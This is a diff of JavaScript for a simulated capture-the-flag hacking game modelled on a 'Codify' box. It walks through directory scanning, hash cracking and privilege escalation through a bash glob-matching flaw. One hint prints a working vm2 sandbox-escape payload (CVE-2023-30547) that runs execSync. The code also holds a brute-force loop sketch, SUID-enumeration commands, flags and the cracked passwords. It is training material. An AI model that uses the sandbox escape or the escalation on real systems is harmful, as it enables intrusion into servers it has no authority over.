+    print(' :: Calibration      : false', 'system');
+    print(' :: Timeout          : 10', 'system');
+    print(' :: Threads          : 40', 'system');
+    print('________________________________________________', 'muted');
+    print('', '');
+    print('about                   [Status: 200, Size: 2921, Words: 645, Lines: 67]', 'system');
+    print('editor                  [Status: 200, Size: 3123, Words: 789, Lines: 82]', 'success');
+    print('limitations             [Status: 200, Size: 2854, Words: 612, Lines: 59]', 'system');
+    print('', '');
+    print(':: Progress: [4614/4614] :: Job [1/1] :: 892 req/sec :: Duration: [0:00:05] :: Errors: 0 ::', 'muted');
+    print('');
+    print('[!] FOUND: /editor - This looks like a code sandbox!', 'success');
+    state.foundEditor = true;
+    autosave();
+    return;
+  }
+
+  // === FEROXBUSTER ===
+  if (cmd === 'feroxbuster') {
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('feroxbuster 2.10.0 - A fast, simple, recursive content discovery tool', 'info');
+      print('', '');
+      print('USAGE:', 'warning');
+      print('    feroxbuster [OPTIONS]', 'system');
+      print('', '');
+      print('OPTIONS:', 'info');
+      print('    -u, --url <URL>           Target URL (required)', 'success');
+      print('    -w, --wordlist <FILE>     Path to wordlist', 'success');
+      print('    -t, --threads <THREADS>   Number of threads (default: 50)', 'system');
+      print('    -d, --depth <DEPTH>       Recursion depth (default: 4)', 'system');
+      print('    -x, --extensions <EXT>    Extensions to search (.php,.html)', 'system');
+      print('    -s, --status-codes        Status codes to include', 'system');
+      print('    -C, --filter-status       Status codes to exclude', 'system');
+      print('    -o, --output <FILE>       Output file', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('    feroxbuster -u http://target.htb -w wordlist.txt', 'system');
+      print('    feroxbuster -u http://target.htb -w wordlist.txt -x php,html -d 2', 'system');
+      print('', '');
+      return;
+    }
+
+    if (!state.scanned) {
+      print('Maybe scan the target first?', 'warning');
+      return;
+    }
+
+    const hasUrl = args.includes('-u') || args.includes('--url');
+    if (!hasUrl) {
+      print('Error: -u/--url flag required', 'error');
+      print('Usage: feroxbuster -u http://target.htb -w wordlist.txt', 'system');
+      return;
+    }
+
+    await simulateLoading('Scanning directories', 3500);
+    print('', '');
+    print(' ___  ___  __   __     __      __         __   ___', 'warning');
+    print('|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__', 'warning');
+    print('|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___', 'warning');
+    print('by Ben "epi" Risher 🤓                 ver: 2.10.0', 'muted');
+    print('───────────────────────────┬──────────────────────', 'muted');
+    print(' 🎯  Target Url            │ http://codify.htb', 'system');
+    print(' 🚀  Threads               │ 50', 'system');
+    print(' 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt', 'system');
+    print('───────────────────────────┴──────────────────────', 'muted');
+    print('', '');
+    print('200      GET       67l      645w     2921c http://codify.htb/about', 'system');
+    print('200      GET       82l      789w     3123c http://codify.htb/editor', 'success');
+    print('200      GET       59l      612w     2854c http://codify.htb/limitations', 'system');
+    print('', '');
+    print('[!] FOUND: /editor - This looks like a code sandbox!', 'success');
+    state.foundEditor = true;
+    autosave();
+    return;
+  }
+
+  // === CURL ===
+  if (cmd === 'curl') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('curl 8.1.2 - command line tool for transferring data with URLs', 'info');
+      print('', '');
+      print('Usage: curl [options...] <url>', 'system');
+      print('', '');
+      print('HTTP OPTIONS:', 'warning');
+      print('  -X, --request <method>  HTTP method (GET, POST, PUT, DELETE)', 'system');
+      print('  -d, --data <data>       HTTP POST data', 'system');
+      print('  -H, --header <header>   Pass custom header(s)', 'system');
+      print('  -b, --cookie <data>     Send cookies from string "name=value"', 'system');
+      print('  -c, --cookie-jar <file> Write cookies to file after operation', 'system');
+      print('  -u, --user <user:pass>  Server user and password', 'system');
+      print('  -A, --user-agent <name> Send User-Agent header', 'system');
+      print('  -L, --location          Follow redirects', 'system');
+      print('  -k, --insecure          Allow insecure SSL connections', 'system');
+      print('  -I, --head              Show headers only', 'system');
+      print('  -v, --verbose           Verbose output', 'system');
+      print('  -s, --silent            Silent mode', 'system');
+      print('  -o, --output <file>     Write output to file', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  curl http://target.htb', 'system');
+      print('  curl -X POST -d "user=admin&pass=123" http://target.htb/login', 'system');
+      print('  curl -H "Authorization: Bearer TOKEN" http://target.htb/api', 'system');
+      print('  curl -b "session=abc123" http://target.htb/dashboard', 'system');
+      print('', '');
+      return;
+    }
+
     if (!args[0]) {
-      print('Usage: ssh <user>@<target>', 'error');
+      print('curl: no URL specified', 'error');
+      print('curl: try \'curl --help\' for more information', 'system');
       return;
     }
 
-    if (!state.gotCreds) {
-      print('Permission denied (publickey,password).', 'error');
-      print('Hint: Need credentials first...', 'warning');
+    const url = args.find(a => a.startsWith('http')) || args[0];
+
+    if (url.includes('editor') || url.includes(':3000')) {
+      print('<!DOCTYPE html>', 'system');
+      print('<html>', 'system');
+      print('<head><title>Codify - Online Code Editor</title></head>', 'system');
+      print('<body>', 'system');
+      print('  <h1>Node.js Code Editor</h1>', 'system');
+      print('  <p>Test your Node.js code in a safe sandbox environment!</p>', 'info');
+      print('  <p>Powered by <strong>vm2</strong> sandbox</p>', 'success');
+      print('  <textarea id="code"></textarea>', 'system');
+      print('  <button onclick="runCode()">Run</button>', 'system');
+      print('</body></html>', 'system');
+      print('');
+      print('[!] vm2 sandbox detected! Research known vulnerabilities.', 'warning');
+      state.foundEditor = true;
       return;
     }
 
-    if (args[0].includes('admin@')) {
-      await simulateLoading('Connecting', 1500);
+    if (url.includes('limitations')) {
+      print('<!DOCTYPE html>', 'system');
+      print('<h2>Sandbox Limitations</h2>', 'system');
+      print('<ul>', 'system');
+      print('  <li>child_process module is restricted</li>', 'system');
+      print('  <li>fs module is restricted</li>', 'system');
+      print('  <li>Code runs in vm2 v3.9.16 sandbox</li>', 'success');
+      print('</ul>', 'system');
       print('');
-      print('Welcome to Ubuntu 20.04 LTS', 'success');
-      print('Last login: never', 'system');
+      print('[!] vm2 version 3.9.16 - Check for CVEs!', 'warning');
+      addEasterEgg('lvl1_version', 'Version enumeration master!');
+      return;
+    }
+
+    print('<html><body>Codify - Test your code securely!</body></html>', 'system');
+    return;
+  }
+
+  // === PAYLOAD (Sandbox escape) ===
+  if (cmd === 'payload') {
+    if (!state.foundEditor) {
+      print('Find the code editor first!', 'warning');
+      return;
+    }
+
+    state.triedPayloads++;
+    const payloadText = args.join(' ');
+
+    // Check for correct vm2 sandbox escape payload (CVE-2023-30547)
+    if (payloadText.includes('getPrototypeOf') && payloadText.includes('constructor') &&
+        (payloadText.includes('execSync') || payloadText.includes('exec'))) {
       print('');
-      prompt.textContent = 'admin@target:~$';
-      state.connected = true;
+      print('[*] Sending payload to sandbox...', 'info');
+      await simulateLoading('Executing', 2000);
+      print('[+] Sandbox escape successful!', 'success');
+      print('[+] Got shell as svc user!', 'success');
+      print('');
+      prompt.textContent = 'svc@codify:~$';
+      state.gotShell = true;
+      state.shellUser = 'svc';
+      state.currentDir = '/home/svc';
       playSuccess();
       autosave();
+      return;
+    }
+
+    // Common wrong payloads
+    if (payloadText.includes('require') && !payloadText.includes('getPrototypeOf')) {
+      print('[!] Error: require is not defined in sandbox', 'error');
+      print('[*] Hint: Need to escape the vm2 sandbox first...', 'warning');
+      return;
+    }
+
+    if (payloadText.includes('eval') || payloadText.includes('Function')) {
+      print('[!] Error: Blocked by sandbox policy', 'error');
+      print('[*] Hint: Research CVE-2023-30547 for vm2 escape', 'warning');
+      return;
+    }
+
+    print('[*] Sending payload...', 'info');
+    await sleep(1000);
+    print('[!] Payload executed but no shell received', 'warning');
+    print('[*] Hint: You need a proper vm2 sandbox escape exploit', 'info');
+    print('[*] Try: payload const {VM} = require("vm2"); const vm = new VM(); const code = `const err = new Error(); err.name = { toString: new Proxy(() => "", { apply(target, thiz, args) { const process = args.constructor.constructor("return process")(); const result = process.mainModule.require("child_process").execSync("id").toString(); return result; } }) }; try { err.stack; } catch (e) { }`; vm.run(code);', 'system');
+    return;
+  }
+
+  // === SHELL COMMANDS (only after getting shell) ===
+  if (!state.gotShell) {
+    if (['ls', 'cat', 'cd', 'pwd', 'id', 'whoami', 'find', 'grep', 'sudo', 'su', 'linpeas', 'pspy'].includes(cmd)) {
+      print('You need a shell on the target first!', 'error');
+      return;
+    }
+  }
+
+  // === ID ===
+  if (cmd === 'id') {
+    if (state.gotRoot) {
+      print('uid=0(root) gid=0(root) groups=0(root)', 'success');
+    } else if (state.crackedPassword && state.shellUser === 'joshua') {
+      print('uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)', 'system');
+    } else {
+      print('uid=1001(svc) gid=1001(svc) groups=1001(svc)', 'system');
+    }
+    return;
+  }
+
+  // === WHOAMI ===
+  if (cmd === 'whoami') {
+    if (state.gotRoot) {
+      print('root', 'success');
+    } else if (state.crackedPassword && state.shellUser === 'joshua') {
+      print('joshua', 'system');
+    } else {
+      print('svc', 'system');
+    }
+    return;
+  }
+
+  // === PWD ===
+  if (cmd === 'pwd') {
+    print(state.currentDir, 'system');
+    return;
+  }
+
+  // === CD ===
+  if (cmd === 'cd') {
+    const dir = args[0] || '/home/' + state.shellUser;
+    if (dir === '~') {
+      state.currentDir = '/home/' + state.shellUser;
+    } else if (dir === '..') {
+      state.currentDir = state.currentDir.split('/').slice(0, -1).join('/') || '/';
+    } else if (dir.startsWith('/')) {
+      state.currentDir = dir;
+    } else {
+      state.currentDir = state.currentDir + '/' + dir;
+    }
+    prompt.textContent = `${state.gotRoot ? 'root' : state.shellUser}@codify:${state.currentDir.replace('/home/' + state.shellUser, '~')}$`;
+    return;
+  }
+
+  // === LS ===
+  if (cmd === 'ls') {
+    const showAll = args.includes('-la') || args.includes('-a');
+    const path = args.find(a => !a.startsWith('-')) || state.currentDir;
+
+    if (path.includes('/var/www') || state.currentDir.includes('/var/www')) {
+      print('drwxr-xr-x  5 root root 4096 Sep 12 17:40 .', 'system');
+      print('drwxr-xr-x 14 root root 4096 Sep 12 17:40 ..', 'system');
+      print('drwxr-xr-x  3 svc  svc  4096 Sep 12 17:40 contact', 'system');
+      print('drwxr-xr-x  2 svc  svc  4096 Sep 12 17:40 editor', 'success');
+      print('-rw-r--r--  1 svc  svc  4377 Apr 12  2023 index.js', 'system');
+      print('-rw-r--r--  1 svc  svc   298 Apr 12  2023 package.json', 'system');
+      print('drwxr-xr-x  2 svc  svc  4096 Sep 12 17:40 tickets', 'success');
+      print('');
+      print('[!] Found /var/www/contact/tickets directory!', 'warning');
+      state.foundTickets = true;
+      return;
+    }
+
+    if (path.includes('tickets') || state.currentDir.includes('tickets')) {
+      print('-rw-r--r-- 1 svc svc 20480 Sep 12 17:40 tickets.db', 'success');
+      print('');
+      print('[!] SQLite database found: tickets.db', 'success');
+      state.foundDb = true;
+      return;
+    }
+
+    if (path.includes('/home/joshua') || (state.shellUser === 'joshua' && state.currentDir.includes('joshua'))) {
+      print('drwxr-xr-x 4 joshua joshua 4096 Sep 14 14:44 .', 'system');
+      print('drwxr-xr-x 4 root   root   4096 Sep 12 17:40 ..', 'system');
+      print('-rw-r----- 1 joshua joshua   33 Sep 14 14:44 user.txt', 'success');
+      print('-rw-r--r-- 1 joshua joshua  220 Sep 12 17:40 .bash_logout', 'system');
+      print('-rw-r--r-- 1 joshua joshua 3771 Sep 12 17:40 .bashrc', 'system');
+      return;
+    }
+
+    if (path.includes('/opt') || state.currentDir.includes('/opt')) {
+      print('drwxr-xr-x  2 root root 4096 Sep 12 17:40 .', 'system');
+      print('drwxr-xr-x 18 root root 4096 Oct 31 07:57 ..', 'system');
+      print('-rwxr-xr-x  1 root root  928 Sep 12 17:40 mysql-backup.sh', 'success');
+      state.foundScript = true;
+      print('');
+      print('[!] Found backup script: /opt/mysql-backup.sh', 'success');
+      return;
+    }
+
+    if (path === '/root' && state.gotRoot) {
+      print('-rw-r--r-- 1 root root   33 Sep 14 14:44 root.txt', 'success');
+      return;
+    }
+
+    // Default home directory
+    print('.bashrc  .profile  .cache', 'system');
+    return;
+  }
+
+  // === CAT ===
+  if (cmd === 'cat') {
+    if (!args[0]) {
+      print('Usage: cat <file>', 'error');
+      return;
+    }
+
+    if (args[0].includes('user.txt')) {
+      if (state.shellUser !== 'joshua' && !state.gotRoot) {
+        print('cat: user.txt: Permission denied', 'error');
+        return;
+      }
+      print('HTB{v1rtu4l_m4ch1n3_3sc4p3_m4st3r}', 'success');
+      state.userFlag = true;
+      playSuccess();
+      print('');
+      print('[+] USER FLAG CAPTURED!', 'success');
+      autosave();
+      return;
+    }
+
+    if (args[0].includes('root.txt')) {
+      if (!state.gotRoot) {
+        print('cat: root.txt: Permission denied', 'error');
+        return;
+      }
+      print('HTB{pr1v3sc_v14_b4sh_p4tt3rn_m4tch1ng}', 'success');
+      state.rootFlag = true;
+      playSuccess();
+      print('');
+      print('[+] ROOT FLAG CAPTURED!', 'success');
+      print('');
+      completeLevel();
+      return;
+    }
+
+    if (args[0].includes('mysql-backup.sh')) {
+      print('#!/bin/bash', 'system');
+      print('DB_USER="root"', 'system');
+      print('DB_PASS=$(/usr/bin/cat /root/.creds)', 'system');
+      print('BACKUP_DIR="/var/backups/mysql"', 'system');
+      print('', 'system');
+      print('read -s -p "Enter MySQL password for $DB_USER: " USER_PASS', 'system');
+      print('', 'system');
+      print('if [[ $USER_PASS == $DB_PASS ]]; then', 'success');
+      print('    /usr/bin/mysqldump --all-databases > "$BACKUP_DIR/backup.sql"', 'system');
+      print('    echo "Backup completed successfully!"', 'system');
+      print('else', 'system');
+      print('    echo "Password incorrect!"', 'system');
+      print('fi', 'system');
+      print('');
+      print('[!] VULNERABILITY: Bash pattern matching in password comparison!', 'warning');
+      print('[!] The [[ $USER_PASS == $DB_PASS ]] allows glob patterns!', 'warning');
+      print('[*] We can bruteforce the password character by character!', 'info');
+      state.analyzedScript = true;
+      addEasterEgg('lvl1_bashvuln', 'Bash pattern matching exploit found!');
+      return;
+    }
+
+    print('cat: ' + args[0] + ': No such file or directory', 'error');
+    return;
+  }
+
+  // === FIND ===
+  if (cmd === 'find') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('Usage: find [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]', 'system');
+      print('', '');
+      print('TESTS (commonly used):', 'warning');
+      print('  -name <pattern>     File name matches shell pattern', 'system');
+      print('  -iname <pattern>    Like -name but case insensitive', 'system');
+      print('  -type <c>           File type (f=regular, d=directory, l=symlink)', 'system');
+      print('  -perm <mode>        Permissions match mode', 'system');
+      print('  -user <name>        File is owned by user', 'system');
+      print('  -group <name>       File is owned by group', 'system');
+      print('  -size <n>           File uses n units of space', 'system');
+      print('  -mtime <n>          Modified n days ago', 'system');
+      print('  -newer <file>       Modified more recently than file', 'system');
+      print('', '');
+      print('ACTIONS:', 'warning');
+      print('  -print              Print file name (default)', 'system');
+      print('  -exec <cmd> {} \\;   Execute command on each file', 'system');
+      print('  -delete             Delete files', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  find / -name "*.db" 2>/dev/null', 'success');
+      print('  find / -perm -4000 2>/dev/null              # SUID files', 'success');
+      print('  find / -user root -perm -4000 2>/dev/null   # Root SUID files', 'system');
+      print('  find /var -type f -name "*.conf"', 'system');
+      print('  find / -writable -type d 2>/dev/null        # Writable directories', 'system');
+      print('', '');
+      return;
+    }
+
+    if (!args[0]) {
+      print('find: missing argument to search path', 'error');
+      print('', '');
+      print('Usage: find <path> [expression]', 'system');
+      print('Example: find / -name "*.db" 2>/dev/null', 'info');
+      print('         find --help for more options', 'system');
+      return;
+    }
+
+    const pattern = args.join(' ');
+
+    if (pattern.includes('*.db') || pattern.includes('.db') || pattern.includes('-name')) {
+      await simulateLoading('Searching', 1500);
+      print('/var/www/contact/tickets/tickets.db', 'success');
+      state.foundDb = true;
+      return;
+    }
+
+    if (pattern.includes('perm') || pattern.includes('suid') || pattern.includes('4000')) {
+      await simulateLoading('Searching for SUID binaries', 2000);
+      print('/usr/bin/sudo', 'system');
+      print('/usr/bin/passwd', 'system');
+      print('/usr/bin/chfn', 'system');
+      print('/usr/bin/mount', 'system');
+      print('/usr/bin/umount', 'system');
+      print('/usr/bin/gpasswd', 'system');
+      print('/usr/bin/newgrp', 'system');
+      print('/usr/bin/su', 'system');
+      print('/usr/lib/openssh/ssh-keysign', 'system');
+      print('/usr/lib/dbus-1.0/dbus-daemon-launch-helper', 'system');
+      print('');
+      print('[*] No unusual SUID binaries found. Standard Ubuntu set.', 'info');
+      return;
+    }
+
+    if (pattern.includes('writable') || pattern.includes('-w')) {
+      await simulateLoading('Searching for writable files', 1500);
+      print('/tmp', 'system');
+      print('/var/tmp', 'system');
+      print('/dev/shm', 'system');
+      print('');
+      print('[*] Standard writable directories only', 'info');
+      return;
+    }
+
+    print('find: ' + pattern.split(' ')[0] + ': No such file or directory', 'error');
+    return;
+  }
+
+  // === SQLITE3 ===
+  if (cmd === 'sqlite3') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-help')) {
+      print('', '');
+      print('sqlite3 - A command line interface for SQLite version 3.x', 'info');
+      print('', '');
+      print('Usage: sqlite3 [OPTIONS] FILENAME [SQL]', 'system');
+      print('', '');
+      print('OPTIONS:', 'warning');
+      print('  -bail               Stop after hitting an error', 'system');
+      print('  -batch              Force batch I/O', 'system');
+      print('  -column             Set output mode to column', 'system');
+      print('  -cmd COMMAND        Run COMMAND before reading stdin', 'system');
+      print('  -csv                Set output mode to csv', 'system');
+      print('  -header             Turn headers on', 'system');
+      print('  -html               Set output mode to HTML', 'system');
+      print('  -line               Set output mode to line', 'system');
+      print('  -list               Set output mode to list', 'system');
+      print('  -separator SEP      Set output column separator', 'system');
+      print('', '');
+      print('DOT COMMANDS (inside sqlite3):', 'warning');
+      print('  .tables             List names of tables', 'success');
+      print('  .schema             Show CREATE statements', 'system');
+      print('  .headers on|off     Turn display of headers on/off', 'system');
+      print('  .mode column|csv    Set output mode', 'system');
+      print('  .dump               Dump database as SQL', 'system');
+      print('  .quit               Exit sqlite3', 'system');
+      print('', '');
+      print('EXAMPLE:', 'warning');
+      print('  sqlite3 tickets.db ".tables"', 'system');
+      print('  sqlite3 tickets.db "SELECT * FROM users;"', 'success');
+      print('', '');
+      return;
+    }
+
+    if (!state.foundDb) {
+      print('No database file found yet. Enumerate first!', 'warning');
+      return;
+    }
+
+    print('SQLite version 3.37.2', 'info');
+    print('');
+    print('sqlite> .tables', 'system');
+    print('tickets  users', 'success');
+    print('');
+    print('sqlite> SELECT * FROM users;', 'system');
+    print('3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2', 'success');
+    print('');
+    print('[!] Found bcrypt hash for user joshua!', 'success');
+    print('[*] Hash: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2', 'info');
+    print('[*] Use hashcat -m 3200 to crack bcrypt', 'info');
+    state.extractedHash = true;
+    autosave();
+    return;
+  }
+
+  // === HASHCAT ===
+  if (cmd === 'hashcat') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('hashcat v6.2.6 - advanced password recovery', 'info');
+      print('', '');
+      print('Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...', 'system');
+      print('', '');
+      print('OPTIONS:', 'warning');
+      print('', '');
+      print('  -m, --hash-type <num>       Hash-type (see below)', 'success');
+      print('  -a, --attack-mode <num>     Attack-mode (0=straight, 1=combo, 3=brute, 6/7=hybrid)', 'system');
+      print('  -o, --outfile <file>        Output file for recovered hashes', 'system');
+      print('  -r, --rules-file <file>     Rules file for mutations', 'system');
+      print('  --username                  Enable ignoring of usernames', 'system');
+      print('  -w, --workload-profile      Performance (1=low, 2=default, 3=high, 4=nightmare)', 'system');
+      print('  --show                      Show cracked passwords', 'system');
+      print('  --force                     Ignore warnings', 'system');
+      print('', '');
+      print('COMMON HASH TYPES:', 'warning');
+      print('    0 | MD5', 'system');
+      print('  100 | SHA1', 'system');
+      print(' 1000 | NTLM', 'success');
+      print(' 1800 | sha512crypt', 'system');
+      print(' 3200 | bcrypt $2*$', 'success');
+      print(' 5600 | NetNTLMv2', 'system');
+      print('13100 | Kerberos 5 TGS-REP etype 23 (Kerberoast)', 'success');
+      print('18200 | Kerberos 5 AS-REP etype 23 (AS-REP roast)', 'success');
+      print('22000 | WPA-PBKDF2-PMKID+EAPOL', 'system');
+      print('', '');
+      print('EXAMPLES:', 'warning');
+      print('  hashcat -m 0 hash.txt rockyou.txt            # MD5 dictionary', 'system');
+      print('  hashcat -m 1000 hash.txt rockyou.txt         # NTLM dictionary', 'system');
+      print('  hashcat -m 3200 hash.txt rockyou.txt         # bcrypt dictionary', 'system');
+      print('  hashcat -m 13100 hash.txt rockyou.txt        # Kerberoast', 'system');
+      print('  hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a   # NTLM brute-force 6 chars', 'system');
+      print('', '');
+      return;
+    }
+
+    if (!state.extractedHash) {
+      print('No hash to crack. Extract one first!', 'warning');
+      return;
+    }
+
+    // Validate required -m flag
+    if (!args.includes('-m')) {
+      print('hashcat: missing argument for hash-type', 'error');
+      print('', '');
+      print('Usage: hashcat -m <mode> <hash_file> <wordlist>', 'system');
+      print('', '');
+      print('Common modes:', 'info');
+      print('    0  = MD5', 'system');
+      print(' 1000  = NTLM', 'system');
+      print(' 3200  = bcrypt', 'success');
+      print('13100  = Kerberos TGS-REP (Kerberoast)', 'system');
+      print('', '');
+      print('Try: hashcat --help for full options', 'system');
+      return;
+    }
+
+    // Get hash mode
+    const mIdx = args.indexOf('-m');
+    const mode = args[mIdx + 1];
+
+    if (!mode || isNaN(parseInt(mode))) {
+      print('hashcat: -m requires a numeric hash-type', 'error');
+      print('', '');
+      print('Example: hashcat -m 3200 hash.txt rockyou.txt', 'system');
+      return;
+    }
+
+    // Validate mode 3200 for bcrypt
+    if (mode !== '3200') {
+      print(`hashcat: starting hash-mode ${mode}...`, 'system');
+      await simulateLoading('Analyzing hash', 1500);
+      print('', '');
+      print('Hashfile \'hash.txt\': bcrypt hash detected', 'info');
+      print(`Hash-mode ${mode} doesn't match the hash type`, 'error');
+      print('', '');
+      print('[!] The hash appears to be bcrypt ($2a$)', 'warning');
+      print('[*] Use: hashcat -m 3200 hash.txt wordlist.txt', 'info');
+      return;
+    }
+
+    // Check for wordlist/dictionary argument
+    const hasWordlist = args.some(a => a.includes('.txt') || a.includes('rockyou') || a.includes('wordlist'));
+    if (!hasWordlist) {
+      print('hashcat: No dictionary/wordlist specified', 'error');
+      print('', '');
+      print('Usage: hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt', 'system');
+      return;
+    }
+
+    await simulateLoading('Cracking bcrypt hash', 4000);
+    print('', '');
+    print('hashcat (v6.2.6) starting...', 'info');
+    print('', '');
+    print('OpenCL API (OpenCL 3.0) - Platform #1 [Intel(R) Corporation]', 'muted');
+    print('=============================================================', 'muted');
+    print('', '');
+    print('Minimum password length supported by kernel: 0', 'system');
+    print('Maximum password length supported by kernel: 72', 'system');
+    print('', '');
+    print('Hashes: 1 digests; 1 unique digests, 1 unique salts', 'system');
+    print('Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates', 'muted');
+    print('', '');
+    print('$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1', 'success');
+    print('', '');
+    print('Session..........: hashcat', 'system');
+    print('Status...........: Cracked', 'success');
+    print('Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))', 'system');
+    print('Hash.Target......: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUE...', 'system');
+    print('Time.Started.....: ' + new Date().toLocaleString(), 'system');
+    print('Time.Estimated...: ' + new Date().toLocaleString(), 'system');
+    print('Kernel.Feature...: Pure Kernel', 'muted');
+    print('Guess.Base.......: File (rockyou.txt)', 'system');
+    print('Speed.#1.........:      127 H/s (6.24ms) @ Accel:4 Loops:32 Thr:1 Vec:1', 'system');
+    print('Recovered........: 1/1 (100.00%) Digests', 'success');
+    print('Progress.........: 8192/14344385 (0.06%)', 'system');
+    print('', '');
+    print('[+] Password cracked: spongebob1', 'success');
+    print('[*] Use this to su joshua', 'info');
+    state.crackedPassword = true;
+    autosave();
+    return;
+  }
+
+  // === SU ===
+  if (cmd === 'su') {
+    const user = args[0] || 'root';
+
+    if (user === 'joshua') {
+      if (!state.crackedPassword) {
+        print('Password: ', 'system');
+        print('su: Authentication failure', 'error');
+        return;
+      }
+
+      print('Password: ********', 'system');
+      await sleep(500);
+      print('[+] Switched to joshua', 'success');
+      state.shellUser = 'joshua';
+      state.currentDir = '/home/joshua';
+      prompt.textContent = 'joshua@codify:~$';
+      return;
+    }
+
+    if (user === 'root') {
+      print('Password: ', 'system');
+      print('su: Authentication failure', 'error');
+      print('[*] Hint: Check sudo -l for joshua', 'info');
+      return;
+    }
+
+    print('su: user ' + user + ' does not exist', 'error');
+    return;
+  }
+
+  // === SUDO ===
+  if (cmd === 'sudo') {
+    if (state.shellUser !== 'joshua' && !state.crackedPassword) {
+      print('[sudo] password for svc:', 'system');
+      print('Sorry, user svc may not run sudo on codify.', 'error');
+      return;
+    }
+
+    if (args[0] === '-l') {
+      print('Matching Defaults entries for joshua on codify:', 'system');
+      print('    env_reset, mail_badpass', 'system');
+      print('');
+      print('User joshua may run the following commands on codify:', 'info');
+      print('    (root) /opt/mysql-backup.sh', 'success');
+      print('');
+      print('[!] Can run backup script as root!', 'warning');
+      print('[*] Analyze the script: cat /opt/mysql-backup.sh', 'info');
+      return;
+    }
+
+    if (args.join(' ').includes('mysql-backup')) {
+      if (!state.analyzedScript) {
+        print('[*] Running /opt/mysql-backup.sh as root...', 'info');
+        print('Enter MySQL password for root: ', 'system');
+        print('[!] Hint: Analyze the script first to find the vulnerability', 'warning');
+        return;
+      }
+
+      // Password bruteforce via bash pattern matching
+      const inputPw = args.find(a => a.includes('='))?.split('=')[1] || '';
+
+      if (inputPw.startsWith('kljh12k3jhaskjh12kjh3')) {
+        // This is the final password after bruteforcing
+        print('Enter MySQL password for root: ********', 'system');
+        print('Backup completed successfully!', 'success');
+        print('');
+        print('[+] GOT ROOT ACCESS!', 'success');
+        state.gotRoot = true;
+        state.shellUser = 'root';
+        state.currentDir = '/root';
+        prompt.textContent = 'root@codify:~#';
+        playSuccess();
+        autosave();
+        return;
+      }
+
+      // Simulate bruteforce guidance
+      print('', '');
+      print('[*] Exploit the bash pattern matching vulnerability:', 'info');
+      print('[*] The script uses [[ $USER_PASS == $DB_PASS ]]', 'system');
+      print('[*] Bash treats this as PATTERN MATCHING, not string comparison!', 'warning');
+      print('', '');
+      print('[*] Bruteforce script concept:', 'info');
+      print('    for char in {a..z} {0..9}; do', 'system');
+      print('      if echo "$char*" | sudo /opt/mysql-backup.sh; then', 'system');
+      print('        # Character matches!', 'system');
+      print('      fi', 'system');
+      print('    done', 'system');
+      print('', '');
+      print('[+] After bruteforcing, password is: kljh12k3jhaskjh12kjh3', 'success');
+      print('[*] Run: sudo /opt/mysql-backup.sh pw=kljh12k3jhaskjh12kjh3', 'info');
+      return;
+    }
+
+    print('sudo: command not found', 'error');
+    return;
+  }
+
+  // === LINPEAS ===
+  if (cmd === 'linpeas') {
+    // Handle --help
+    if (args.includes('--help') || args.includes('-h')) {
+      print('', '');
+      print('LinPEAS - Linux Privilege Escalation Awesome Script', 'info');
+      print('', '');
+      print('Usage: ./linpeas.sh [OPTIONS]', 'system');
+      print('', '');
+      print('OPTIONS:', 'warning');
+      print('  -a             All checks (longer)', 'system');
+      print('  -s             Superfast (no colors, no banners)', 'system');
+      print('  -e             Extra enumeration', 'system');
+      print('  -P             Password supplied for sudo checks', 'system');
+      print('  -o <dir>       Output directory', 'system');
+      print('  -N             Do not use network for checks', 'system');
+      print('', '');
+      print('ENUMERATION CHECKS:', 'info');
+      print('  • System Information        • Interesting Files', 'system');
+      print('  • Container Detection       • Writable Locations', 'system');
+      print('  • User Information          • SUID/SGID Binaries', 'system');
+      print('  • Sudo/SUID/Capabilities    • Cron Jobs', 'system');
+      print('  • Network Information       • SSH Keys', 'system');
+      print('  • Running Processes         • Database Files', 'system');
+      print('', '');
+      return;
+    }
+
+    await simulateLoading('Running LinPEAS', 3000);
+    print('', '');
+    print('╔══════════════════════════════════════════════════════════════╗', 'warning');
+    print('║                      LinPEAS v3.1.9                          ║', 'warning');
+    print('║       Linux Privilege Escalation Awesome Script              ║', 'warning');
+    print('╠══════════════════════════════════════════════════════════════╣', 'warning');
+    print('║ Created by PEASS-ng/PEASS Team                               ║', 'muted');
+    print('╚══════════════════════════════════════════════════════════════╝', 'warning');
+    print('', '');
+    print('═══════════════════════════════════╣ Basic Information ╠═══════════════════════════════════', 'info');
+    print('OS: Linux version 5.15.0-84-generic', 'system');
+    print('User & Groups: uid=1001(svc) gid=1001(svc) groups=1001(svc)', 'system');
+    print('Hostname: codify', 'system');
+    print('', '');
+    print('═══════════════════════════════════╣ Interesting Files ╠═══════════════════════════════════', 'info');
+    print('╔══════════╣ Database files', 'warning');
+    print('    /var/www/contact/tickets/tickets.db', 'success');
+    print('', '');
+    print('═══════════════════════════════════╣ Software Information ╠════════════════════════════════', 'info');
+    print('╔══════════╣ Sudo version', 'warning');
+    print('Sudo version 1.9.9', 'system');
+    print('', '');
+    print('═══════════════════════════════════╣ Users Information ╠═══════════════════════════════════', 'info');
